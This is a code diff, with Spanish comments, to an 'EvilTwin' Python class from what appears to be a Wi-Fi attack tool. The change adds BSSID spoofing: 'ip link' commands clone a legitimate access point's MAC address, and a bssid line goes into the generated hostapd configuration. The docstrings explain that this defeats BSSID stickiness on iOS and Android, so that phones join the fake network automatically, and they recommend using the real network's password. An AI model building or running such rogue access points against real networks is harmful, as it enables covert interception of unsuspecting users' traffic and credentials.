@@ -52,14 +52,35 @@ class EvilTwin:
             return "g"
         return "a" if ch >= 36 else "g"
 
-    def _write_hostapd_conf(self, ssid, channel, security, wpa_passphrase="wiretrap123"):
+    def _spoof_bssid(self, bssid: str):
+        """
+        Clona la MAC del AP legítimo en la interfaz AP.
+        Con mismo SSID + misma contraseña + mismo BSSID, iOS/Android
+        no distinguen el Evil Twin del AP real y conectan al de mayor señal.
+        """
+        subprocess.run(
+            ["ip", "link", "set", self.interface, "down"],
+            capture_output=True
+        )
+        subprocess.run(
+            ["ip", "link", "set", self.interface, "address", bssid],
+            capture_output=True
+        )
+        subprocess.run(
+            ["ip", "link", "set", self.interface, "up"],
+            capture_output=True
+        )
+
+    def _write_hostapd_conf(self, ssid, channel, security,
+                            wpa_passphrase="wiretrap123", bssid=None):
         """Genera el archivo de configuración de hostapd"""
         hw_mode = self._hw_mode_for_channel(channel)
-        # ieee80211n habilita 802.11n; en 5GHz añadimos ieee80211ac
-        # para que el AP falso se comporte de forma más creíble.
         extra = "ieee80211n=1\n"
         if hw_mode == "a":
             extra += "ieee80211ac=1\ncountry_code=ES\n"
+        # Si se especifica BSSID (spoof), lo forzamos en hostapd también
+        # para que los beacons salgan con esa dirección.
+        bssid_line = f"bssid={bssid}\n" if bssid else ""
 
         if security == "WPA2":
             conf = f"""interface={self.interface}
@@ -67,7 +88,7 @@ driver=nl80211
 ssid={ssid}
 hw_mode={hw_mode}
 channel={channel}
-{extra}macaddr_acl=0
+{bssid_line}{extra}macaddr_acl=0
 auth_algs=1
 wpa=2
 wpa_passphrase={wpa_passphrase}
@@ -75,13 +96,12 @@ wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 """
         else:
-            # Red abierta — más fácil que el cliente conecte
             conf = f"""interface={self.interface}
 driver=nl80211
 ssid={ssid}
 hw_mode={hw_mode}
 channel={channel}
-{extra}macaddr_acl=0
+{bssid_line}{extra}macaddr_acl=0
 auth_algs=1
 """
         with open(self.hostapd_conf, "w") as f:
@@ -170,7 +190,7 @@ log-dhcp
 
     def start(self, ssid, channel=6,
               security="OPEN", out_interface="eth0",
-              wpa_passphrase="wiretrap123"):
+              wpa_passphrase="wiretrap123", target_bssid=None):
         """
         Lanza el evil twin completo.
 
@@ -179,16 +199,21 @@ log-dhcp
             channel:        Canal del AP objetivo
             security:       OPEN o WPA2
             out_interface:  Interfaz con internet real (eth0, wlan0...)
-            wpa_passphrase: Contraseña WPA2 (idealmente la real del AP
-                            objetivo para que los clientes conecten
-                            automáticamente sin interacción)
+            wpa_passphrase: Contraseña WPA2 real del AP para auto-conexión
+            target_bssid:   BSSID del AP legítimo para spoofear la MAC.
+                            Crítico en iOS/Android modernos: sin esto el
+                            dispositivo ignora el Evil Twin aunque SSID y
+                            contraseña sean correctos (BSSID stickiness).
         """
         if self.running:
             return
 
         try:
             self._kill_conflicts()
-            self._write_hostapd_conf(ssid, channel, security, wpa_passphrase)
+            if target_bssid:
+                self._spoof_bssid(target_bssid)
+            self._write_hostapd_conf(ssid, channel, security,
+                                     wpa_passphrase, target_bssid)
             self._write_dnsmasq_conf()
             self._setup_interface(channel)
             self._enable_forwarding(out_interface)
